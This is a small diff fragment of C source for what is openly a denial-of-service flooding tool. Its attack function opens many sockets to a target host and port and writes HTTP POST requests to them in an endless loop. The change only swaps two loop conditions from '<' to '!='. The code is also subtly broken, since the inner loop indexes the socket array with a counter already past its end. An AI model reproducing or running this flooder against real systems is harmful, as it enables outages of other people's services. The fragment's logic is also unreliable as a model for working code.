@@ -59,12 +59,12 @@ int make_socket(char *host, char *port) {
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, i, g=1, r;
-	for(x=0; x < CONNECTIONS; x++)
+	for(x=0; x != CONNECTIONS; x++)
 		sockets[x]=0;
 	
 	while(1) {
 		
-		for(i=0; i < PPS; i++) {
+		for(i=0; i != PPS; i++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 19);
